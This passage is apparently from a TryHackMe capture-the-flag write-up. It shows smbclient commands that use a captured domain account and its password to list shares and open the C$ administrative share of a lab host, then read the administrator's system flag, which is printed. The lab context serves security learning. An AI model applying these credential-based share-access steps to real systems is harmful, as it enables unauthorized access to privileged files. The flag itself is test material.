Will try to connect with C$ Share as we are not local adminssssssssssssssssssss
```
smbclient -L 10.10.238.58 -U enterprise-security@vulnnet.local
sand_0873959498
```
![[Pasted image 20230917230729.png]]

```
smbclient \\\\10.10.238.58\\C$ -U 'enterprise-security' 
sand_0873959498
```

We have to use ls and cd to reach the users->administrator->deskptop->system.txt
![[Pasted image 20230917231137.png]]
```
THM{d540c0645975900e5bb9167aa431fc9b}
```
![[Pasted image 20230917231113.png]]


